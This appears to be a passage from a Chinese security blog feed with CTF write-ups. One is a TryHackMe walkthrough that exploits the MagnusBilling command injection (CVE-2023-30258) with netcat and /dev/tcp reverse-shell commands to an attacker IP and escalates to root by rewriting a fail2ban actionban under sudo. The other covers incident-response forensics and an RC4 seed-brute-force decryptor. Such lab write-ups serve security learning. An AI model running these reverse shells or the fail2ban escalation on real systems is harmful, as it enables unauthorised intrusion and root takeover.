目录</p><p><img src="https://img.dkdun.cn/v1/2025/12/31f0fcb362e4d0d4.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/367bafcec7d7b91e.png"></p><h1 id="利用-MagnusSolution-Magnusbilling-RCE-反弹-shell"><a href="#利用-MagnusSolution-Magnusbilling-RCE-反弹-shell" class="headerlink" title="利用 MagnusSolution Magnusbilling RCE 反弹 shell"></a>利用 MagnusSolution Magnusbilling RCE 反弹 shell</h1><p>根据漏洞描述，漏洞应该是 <a href="https://avd.aliyun.com/detail?id=AVD-2023-30258">magnusbilling 安全漏洞 (CVE-2023-30258)</a></p><p>用的 n0o0b 师傅写的 POC：<a href="https://github.com/n00o00b/CVE-2023-30258-RCE-POC">CVE-2023-30258-RCE-POC</a></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python poc.py -u http:<span class="hljs-string">//10.10.133.205/mbilling</span> <span class="hljs-params">--cmd</span> <span class="hljs-string">&quot;nc -c sh 10.21.118.213 1234&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/9c253cf0cdf590d8.png"></p><p>谈上了嘻嘻好用捏</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p>可以提高交互性</p><p>进入 <code>/home/magnus</code> 拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">THM</span>&#123;<span class="hljs-number">4</span>a6831d5f124b25eefb1e92e0f0da4ca&#125;<br></code></pre></td></tr></table></figure><h1 id="修改-fail2ban-的-sshd-规则组提权"><a href="#修改-fail2ban-的-sshd-规则组提权" class="headerlink" title="修改 fail2ban 的 sshd 规则组提权"></a>修改 fail2ban 的 sshd 规则组提权</h1><p>使用 <code>sudo -l</code> 发现</p><p><img src="https://img.dkdun.cn/v1/2025/12/4da0342bcb66d9a6.png"></p><p><code>NOPASSWD</code> 的 <code>fail2ban-client</code>，更详细的 <code>fail2ban</code> 提权可以看 <a href="https://juggernaut-sec.com/fail2ban-lpe/">Fail2Ban – Linux Privilege Escalation</a>，但 <code>iptables-multiport.conf</code> 没有写的权限。</p><p>运行 <code>fail2ban-client</code> 找到</p><p><img src="https://img.dkdun.cn/v1/2025/12/b172b7389122579a.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> &lt;JAIL&gt; action &lt;ACT&gt; actionban &lt;CMD&gt;<br></code></pre></td></tr></table></figure><p>这个命令能够自定义 <code>jail</code> 和 <code>action</code> ，并且前面发现是 <code>NOPASSWD</code> ，可以执行 sudo 权限</p><p>查看 <code>fail2ban-client</code> 的状态，发现了活跃的 <code>sshd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> fail2ban-client status<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f133287a33f97ca6.png"></p><p>读取 <code>/etc/fail2ban</code> 下的 <code>jail.conf</code> 文件发现了 <code>sshd</code> 配置</p><p><img src="https://img.dkdun.cn/v1/2025/12/472d3486dc39fa44.png"></p><p>综上所述，可以修改 <code>sshd</code> 的 <code>actionban</code> 规则来执行 ：在封禁 IP 时执行一个反向 Shell 连接，通过封禁本机 IP <code>127.0.0.1</code> 这一操作触发 <code>actionban</code> ，让反向 Shell 连接生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /usr/bin/fail2ban-client <span class="hljs-built_in">set</span> sshd action iptables-multiport actionban <span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.21.118.213/2233 0&gt;&amp;1&#x27;&quot;</span><br><br><span class="hljs-built_in">sudo</span> /usr/bin/fail2ban-client <span class="hljs-built_in">set</span> sshd banip 127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d69cc689cfed3a72.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">THM</span>&#123;<span class="hljs-number">33</span>ad5b530e71a172648f424ec23fae60&#125;<br></code></pre></td></tr></table></figure><h1 id="CVE-2023-30258"><a href="#CVE-2023-30258" class="headerlink" title="CVE-2023-30258"></a>CVE-2023-30258</h1><p>根据描述 <a href="https://eldstal.se/advisories/230327-magnusbilling.html">CVE-2023-30258 Security advisory</a> 找到源代码 </p><p><img src="https://img.dkdun.cn/v1/2025/12/3156c7eee9182ce3.png"></p><p><a href="https://github.com/magnussolution/magnusbilling7/blob/f6cd038161349895ff6f186405b9a89f564c9448/lib/icepay/icepay.php#L753">magnusbilling  的漏洞点</a> 如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;democ&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;democ&#x27;</span>]) &gt; <span class="hljs-number">5</span>) &#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;touch &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;democ&#x27;</span>] . <span class="hljs-string">&#x27;.txt&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;rm -rf *.txt&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>democ 检查字符长度是否超过5，超过后就将字符串传递给了 <code>exec()</code> 函数，并没有经过过滤，所以就能执行任意命令，出现了命令注入</p><h1 id="Fail2Ban"><a href="#Fail2Ban" class="headerlink" title="Fail2Ban"></a>Fail2Ban</h1><p>一个开源的入侵防御工具，用于防止暴力破解攻击。它通过监控系统的日志文件（如 <code>/var/log/auth.log</code>），检测是否存在多次失败的登录尝试。一旦检测到某个 IP 地址在短时间内发生了多次失败的登录尝试，<code>fail2ban</code> 会自动将该 IP 地址加入防火墙的黑名单，阻止该 IP 地址进一步尝试登录，封禁时间过后会恢复正常访问，如果再次攻击，封禁会再次生效。</p><p>关键配置文件</p><ul><li>fail2ban.conf：配置操作设置</li><li>jail.conf：主配置文件，用于定义每个程序的 ”jails“</li><li>jail.local：jail.conf 的扩展，用于启用 jail，通常在更新后保留自定义设置</li><li>iptables-multiport.conf：负责设置防火墙的操作文件，允许修改以禁止恶意 IP，并根据需要添加和删除</li></ul><p>fail2ban 权限提升可以看 <a href="https://juggernaut-sec.com/fail2ban-lpe/">Fail2Ban – Linux Privilege Escalation</a>，可惜的是靶机 <code>iptables-multiport.conf</code> 没有写的权限。</p><p>对于这个靶机，通过枚举了活跃的 <code>jail</code> 找到了 <code>sshd</code>，然后根据 <code>fail2ban</code> 的使用命令构造 payload 修改 <code>sshd</code> 的规则组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /usr/bin/fail2ban-client <span class="hljs-built_in">set</span> sshd action iptables-multiport actionban <span class="hljs-string">&quot;payload&quot;</span><br></code></pre></td></tr></table></figure><p>然后执行 ban IP 触发 <code>actionban</code> 逻辑让前面的命令执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /usr/bin/fail2ban-client get sshd banip IP<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fail2ban</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025年Solar应急响应公益月赛-3月</title>
    <link href="/2025/03/31/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-3%E6%9C%88/"/>
    <url>/2025/03/31/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-3%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<p>比赛 + 赛后复现的题解</p><span id="more"></span><h1 id="【签到】和黑客去Battle把！"><a href="#【签到】和黑客去Battle把！" class="headerlink" title="【签到】和黑客去Battle把！"></a>【签到】和黑客去Battle把！</h1><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">题目描述<br>某某文化有限公司被加密啦！老板给了小王<span class="hljs-number">5000</span>美元请你帮助小王和黑客谈判争取使用最低的价格买下密钥！<br>【用户ID为登录青少年<span class="hljs-built_in">CTF</span>平台的手机号】<br>【本题为模拟请勿当真！禁止攻击平台！】<br></code></pre></td></tr></table></figure><p>打开 README.txt，找到了 ID 和网址：<a href="https://www.phantomhand.top/">https://www.phantomhand.top/</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/aa976af1355045f2.png"></p><p>ID 和手机号登录，一直跟它讨价还价，直到它接受 5000 USDT，然后答应就拿到 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/1f5e89e3882d4b2e.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;H7Q44S85842W6TQZPERS72ED&#125;</span><br></code></pre></td></tr></table></figure><h1 id="窃密排查-1"><a href="#窃密排查-1" class="headerlink" title="窃密排查-1"></a>窃密排查-1</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">题目描述<br>发现内部数据被窃取，进行紧急上机。请通过黑客遗留痕迹进行排查：<br>找到黑客窃密工具的账号<br></code></pre></td></tr></table></figure><p>把目录翻遍，在 <code>/tmp</code> 目录下找到了 mega 服务，root 运行</p><p><img src="https://img.dkdun.cn/v1/2025/12/f160096680cfd7fe.png"></p><p>进入 <code>/root</code> 目录找到隐藏文件夹</p><p><img src="https://img.dkdun.cn/v1/2025/12/97b4d8ad9f63a471.png"></p><p>查看目录下的  <code>megacmdserver.log</code> 日志文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/4a4c3443940619c1.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">26</span>_03-<span class="hljs-number">51</span>-<span class="hljs-number">59</span>.<span class="hljs-number">862963</span> cmd INFO Login complete as <span class="hljs-number">25</span>solar3abc@habenwir.com<span class="hljs-meta"> [megacmdexecuter.cpp:2721]</span><br></code></pre></td></tr></table></figure><p>找到账号 <code>25solar3abc@habenwir.com</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">25solar3abc@</span>habenwir.com&#125;<br></code></pre></td></tr></table></figure><h1 id="2503逆向"><a href="#2503逆向" class="headerlink" title="2503逆向"></a>2503逆向</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">题目描述<br>重要文件被加密了，请分析加密器解开该文件。<br>提示：加密前的文件前四个字节为<span class="hljs-built_in">flag</span>，且开机时间较短<br></code></pre></td></tr></table></figure><p>64 位可执行文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/5a862ddcd39f4ad0.png"></p><p>shift+f12 搜索字符串，然后从字符串定位到 main 函数</p><p><img src="https://img.dkdun.cn/v1/2025/12/59f81bc93c41181e.png"></p><p>大概流程：读取明文文件 <code>flag.txt</code>，用 <code>GetTickCount()</code> 作为 <code>srand</code> 种子，生成16字节随机密钥，字符都来自 <code>v14</code> 这个字符集，也就是上面的 <code>qa0wserdf1tg9yuhjio2pklz8xbvcn4mPL7JKOIHUG3YTF6DSREAWQZX5MNCBV</code> 这串字符，然后调用 <code>sub_140001350</code> 函数进行加密得到 <code>flag.txt.freefix</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/f41eed6e17fa4774.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/636739aa175da7da.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/adcdc0d9341acbf9.png"></p><p><code>sub_140001350</code> 是标准的 RC4 算法，包含 KSA 和 PRGA 阶段</p><p><img src="https://img.dkdun.cn/v1/2025/12/86bd2eb3f1d0b7a8.png"></p><p>010 打开加密文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/d12b6b43876a1465.png"></p><p>提取加密后文件数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4C</span> <span class="hljs-number">00</span> <span class="hljs-number">2</span>F AD <span class="hljs-number">84</span> <span class="hljs-number">10</span> <span class="hljs-number">58</span> AC <span class="hljs-number">8</span>D D1 <span class="hljs-number">59</span> <span class="hljs-number">69</span> <span class="hljs-number">79</span> FB <span class="hljs-number">9</span>D B5 C5 FA <span class="hljs-number">60</span> <span class="hljs-number">17</span> B0 <span class="hljs-number">46</span> E8 <span class="hljs-number">75</span> D6 CD DE D7 <span class="hljs-number">57</span> DC <span class="hljs-number">7</span>C <span class="hljs-number">96</span> E1 <span class="hljs-number">15</span> F3 BD C0 <span class="hljs-number">72</span> <span class="hljs-number">98</span> <span class="hljs-number">91</span> <span class="hljs-number">88</span> <span class="hljs-number">4</span>D <span class="hljs-number">0</span>C BA <span class="hljs-number">66</span> <span class="hljs-number">04</span> C9<br></code></pre></td></tr></table></figure><p>拷问 deepseek 能出，爆破种子，poc 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-comment"># 字符池（与C++代码一致）</span><br>CHAR_POOL = <span class="hljs-string">&quot;qa0wserdf1tg9yuhjio2pklz8xbvcn4mPL7JKOIHUG3YTF6DSREAWQZX5MNCBV&quot;</span><br><br><span class="hljs-comment"># 加密后的数据（替换为你的实际密文）</span><br>CIPHER_HEX = <span class="hljs-string">&quot;4C002FAD841058AC8DD1596979FB9DB5C5FA6017B046E875D6CDDED757DC7C96E115F3BDC0729891884D0CBA6604C9&quot;</span><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(CIPHER_HEX)<br><br><span class="hljs-comment"># -------------------------------</span><br><span class="hljs-comment"># 精确模拟C++的随机数生成器</span><br><span class="hljs-comment"># -------------------------------</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MSVCRand</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, seed</span>):<br>        <span class="hljs-variable language_">self</span>.state = seed<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.state = (<span class="hljs-variable language_">self</span>.state * <span class="hljs-number">214013</span> + <span class="hljs-number">2531011</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">self</span>.state &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x7FFF</span>  <span class="hljs-comment"># 保留低15位</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_key</span>(<span class="hljs-params">seed</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;生成16字节密钥（严格匹配C++逻辑）&quot;&quot;&quot;</span><br>    rng = MSVCRand(seed)<br>    key = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        index = rng.rand() % <span class="hljs-number">62</span>  <span class="hljs-comment"># 62个字符</span><br>        key.append(CHAR_POOL[index])<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(key)<br><br><span class="hljs-comment"># -------------------------------</span><br><span class="hljs-comment"># RC4解密函数（与sub_140001350严格一致）</span><br><span class="hljs-comment"># -------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    <span class="hljs-comment"># 初始化S盒</span><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    key_bytes = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key]<br>    key_len = <span class="hljs-built_in">len</span>(key_bytes)<br><br>    <span class="hljs-comment"># KSA阶段</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key_bytes[i % key_len]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    <span class="hljs-comment"># PRGA阶段</span><br>    i = j = <span class="hljs-number">0</span><br>    plaintext = []<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ciphertext:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        plaintext.append(byte ^ k)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(plaintext)<br><br><span class="hljs-comment"># -------------------------------</span><br><span class="hljs-comment"># 多线程暴力破解（保持0-10,000,000范围）</span><br><span class="hljs-comment"># -------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">seed</span>):<br>    key = generate_key(seed)<br>    plaintext = rc4_decrypt(ciphertext, key)<br>    <span class="hljs-comment"># 严格检测flag格式（减少误报）</span><br>    <span class="hljs-keyword">if</span> plaintext.startswith(<span class="hljs-string">b&#x27;flag&#123;&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">b&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> plaintext:<br>        <span class="hljs-keyword">return</span> seed, key, plaintext.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] 正在破解种子范围: 0 - 10,000,000&quot;</span>)<br><br>    <span class="hljs-comment"># 多线程加速（根据CPU调整线程数）</span><br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">8</span>) <span class="hljs-keyword">as</span> executor:<br>        chunk_size = <span class="hljs-number">100000</span>  <span class="hljs-comment"># 每10万次为一组</span><br>        total = <span class="hljs-number">10_000_000</span><br>        found = <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> base <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, total, chunk_size):<br>            chunk_start = base<br>            chunk_end = <span class="hljs-built_in">min</span>(base + chunk_size, total)<br>            <br>            <span class="hljs-comment"># 提交任务</span><br>            futures = [executor.submit(worker, seed) <span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(chunk_start, chunk_end)]<br>            <br>            <span class="hljs-comment"># 检查结果</span><br>            <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> futures:<br>                result = future.result()<br>                <span class="hljs-keyword">if</span> result:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] 解密成功！种子: <span class="hljs-subst">&#123;result[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 使用的密钥: <span class="hljs-subst">&#123;result[<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Flag内容: <span class="hljs-subst">&#123;result[<span class="hljs-number">2</span>]&#125;</span>&quot;</span>)<br>                    found = <span class="hljs-literal">True</span><br>                    executor.shutdown(wait=<span class="hljs-literal">False</span>)<br>                    sys.exit(<span class="hljs-number">0</span>)<br>            <br>            <span class="hljs-comment"># 进度显示</span><br>            progress = (chunk_end / total) * <span class="hljs-number">100</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\r进度: <span class="hljs-subst">&#123;chunk_end:,&#125;</span>/<span class="hljs-subst">&#123;total:,&#125;</span> (<span class="hljs-subst">&#123;progress:<span class="hljs-number">.2</span>f&#125;</span>%)&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>, flush=<span class="hljs-literal">True</span>)<br>            <br>            <span class="hljs-keyword">if</span> found:<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[-] 未在指定范围内找到有效种子，建议：&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  1. 检查密文是否正确&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  2. 扩大种子范围（参见之前的7天范围方案）&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>拿到 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/70ad60496b1defb9.png"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">flag&#123;hello_www.sierting.com_fodhaoijsa<span class="hljs-number">08324082</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="溯源排查-1"><a href="#溯源排查-1" class="headerlink" title="溯源排查-1"></a>溯源排查-1</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">题目描述<br>某企业的阿里云服务器，现已将镜像从阿里云下载下来，该服务器存在奇怪的外连，请排查出外连地址<br></code></pre></td></tr></table></figure><p>把 raw 转成 vmdk 再导入 VM，然后登录对 eth0 抓包，监控非 SSH 的流量</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -i eth0 not port <span class="hljs-number">22</span> -nn<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/e16ec3caaa647fd9.png"></p><p>发现了对同一个 IP 请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">156.238.230.167:46578</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="溯源排查-2"><a href="#溯源排查-2" class="headerlink" title="溯源排查-2"></a>溯源排查-2</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">题目描述<br>排查外连进程程序的绝对路径<br></code></pre></td></tr></table></figure><p><code>systemctl status</code> 查看服务发现同时有两个相似服务， <code>systemd-journald</code> 用于日志管理，另一个 <code>journaled</code> 是伪造成系统进程的外连进程</p><p><img src="https://img.dkdun.cn/v1/2025/12/d37f87ad30f90a7e.png"></p><p>同时也可以用 top 命令监控系统进程资源</p><p><img src="https://img.dkdun.cn/v1/2025/12/35767736f496ff40.png"></p><p>然后查找位置</p><p><img src="https://img.dkdun.cn/v1/2025/12/92f56b17131aafb4.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">flag&#123;<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/systemd/</span>journaled&#125;<br></code></pre></td></tr></table></figure><h1 id="溯源排查-3"><a href="#溯源排查-3" class="headerlink" title="溯源排查-3"></a>溯源排查-3</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">题目描述<br>排查后门，提交其完整名称<br></code></pre></td></tr></table></figure><p>R-Studio 挂载进入上面的目录</p><p><img src="https://img.dkdun.cn/v1/2025/12/c658928f87467db7.png"></p><p>可以链接到 <code>/tmp/tmp/hsperfdata_root</code> 内的两个被删除的文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/2b49097be9a7f169.png"></p><p>在 <code>/etc/systemd/system</code> 下可以找到这个服务，就是这个服务名称</p><p><img src="https://img.dkdun.cn/v1/2025/12/b489a605e4460f27.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;systemd-journaled&#125;</span><br></code></pre></td></tr></table></figure><h1 id="溯源排查-4"><a href="#溯源排查-4" class="headerlink" title="溯源排查-4"></a>溯源排查-4</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">题目描述<br>业务系统已被删除，找出可能存在漏洞的应用<br></code></pre></td></tr></table></figure><p>发现有 nacos </p><p><img src="https://img.dkdun.cn/v1/2025/12/791bc4c2860ece86.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;nacos&#125;</span><br></code></pre></td></tr></table></figure><h1 id="溯源排查-5"><a href="#溯源排查-5" class="headerlink" title="溯源排查-5"></a>溯源排查-5</h1><p><a href="https://blog.csdn.net/qq_55202378/article/details/141287014">Nacos历史漏洞复现（汇总）</a></p><p><img 